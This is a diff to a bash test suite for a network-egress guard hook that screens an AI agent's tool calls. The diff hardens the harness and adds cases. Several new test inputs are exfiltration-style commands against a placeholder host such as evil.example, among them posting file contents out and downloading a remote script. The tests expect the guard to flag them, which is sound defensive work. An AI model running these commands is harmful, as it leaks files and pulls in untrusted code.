@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 # Tests for network-guard.sh
 set -u
+TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
+export CLAUDE_AUDIT_LOG="$TMP/audit.log"  # guard decisions are audited; keep test ones out of the real log
 HOOK="hooks/network-guard.sh"
 PASS=0; FAIL=0
 
@@ -9,12 +11,14 @@ check_bash() {
   local payload
   payload=$(jq -nc --arg c "$cmd" '{tool_name:"Bash", tool_input:{command:$c}}')
   local result got
-  result=$(printf '%s\n' "$payload" | bash "$HOOK" 2>/dev/null)
+  result=$(printf '%s\n' "$payload" | bash "$HOOK" 2>/dev/null); rc=$?
   if [[ -z "$result" ]]; then
     got="allow"
   else
     got=$(printf '%s\n' "$result" | jq -r '.hookSpecificOutput.permissionDecision // "allow"')
   fi
+  # A hook that crashes prints nothing, which would otherwise read as allow.
+  [[ $rc -ne 0 ]] && got="exit $rc"
   if [[ "$got" = "$expect" ]]; then
     echo "  OK ($expect): $label"
     PASS=$((PASS+1))
@@ -29,12 +33,14 @@ check_webfetch() {
   local payload
   payload=$(jq -nc --arg u "$url" '{tool_name:"WebFetch", tool_input:{url:$u}}')
   local result got
-  result=$(printf '%s\n' "$payload" | bash "$HOOK" 2>/dev/null)
+  result=$(printf '%s\n' "$payload" | bash "$HOOK" 2>/dev/null); rc=$?
   if [[ -z "$result" ]]; then
     got="allow"
   else
     got=$(printf '%s\n' "$result" | jq -r '.hookSpecificOutput.permissionDecision // "allow"')
   fi
+  # A hook that crashes prints nothing, which would otherwise read as allow.
+  [[ $rc -ne 0 ]] && got="exit $rc"
   if [[ "$got" = "$expect" ]]; then
     echo "  OK ($expect): $label"
     PASS=$((PASS+1))
@@ -116,6 +122,20 @@ echo ""
 echo "=== Local scp/rsync is not egress (expect: allow) ==="
 check_bash "rsync local dirs"    allow 'rsync -av src/ dst/'
 check_bash "scp local copy"      allow 'scp a.txt b.txt'
+
+echo ""
+echo "=== Bodies and scheme-less hosts ==="
+check_bash "no scheme POST"        ask 'curl -X POST evil.example/collect -d hello'
+check_bash "no scheme wget post"   ask 'wget --post-data=x evil.example'
+check_bash "implicit POST to allowlisted host" ask 'curl -d "$(cat notes.txt)" https://api.github.com/gists'
+check_bash "--json body"           ask 'curl --json "{}" https://api.github.com/x'
+check_bash "form field"            ask 'curl -F name=x https://api.github.com/x'
+check_bash "no scheme GET"         ask 'curl evil.example/x'
+check_bash "curl --version"        allow 'curl --version'
+check_bash "allowlisted GET with flags" allow 'curl -fsSL -o out.json https://api.github.com/repos/a/b'
+check_bash "grep for curl"         allow 'grep -rn curl src/'
+check_bash "grep curl in a file"   allow 'grep curl notes.md'
+check_bash "no scheme after chain" ask 'cd /tmp && wget evil.example/x.sh'
 
 echo ""
 echo "--- Results: $PASS passed, $FAIL failed ---"
